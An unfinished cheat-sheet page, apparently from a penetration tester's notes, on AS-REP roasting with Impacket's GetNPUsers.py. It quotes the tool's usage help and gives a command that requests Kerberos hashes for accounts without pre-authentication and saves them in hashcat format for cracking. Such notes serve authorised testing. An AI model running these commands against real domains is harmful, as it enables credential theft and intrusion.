---
description: A finir
---

# ASREP

```
 parser.print_help()
        print("\nThere are a few modes for using this script")
        print("\n1. Get a TGT for a user:")
        print("\n\tGetNPUsers.py contoso.com/john.doe -no-pass")
        print("\nFor this operation you don\'t need john.doe\'s password. It is important tho, to specify -no-pass in the script, "
              "\notherwise a badpwdcount entry will be added to the user")
        print("\n2. Get a list of users with UF_DONT_REQUIRE_PREAUTH set")
        print("\n\tGetNPUsers.py contoso.com/emily:password or GetNPUsers.py contoso.com/emily")
        print("\nThis will list all the users in the contoso.com domain that have UF_DONT_REQUIRE_PREAUTH set. \nHowever "
              "it will require you to have emily\'s password. (If you don\'t specify it, it will be asked by the script)")
        print("\n3. Request TGTs for all users")
        print("\n\tGetNPUsers.py contoso.com/emily:password -request or GetNPUsers.py contoso.com/emily")
        print("\n4. Request TGTs for users in a file")
        print("\n\tGetNPUsers.py contoso.com/ -no-pass -usersfile users.txt")
        print("\nFor this operation you don\'t need credentials.")
```

```
GetNPUsers.py <domain.local>/<USER>:<PASS> -request -format hashcat -outputfile hashs_<IP>.txt
```
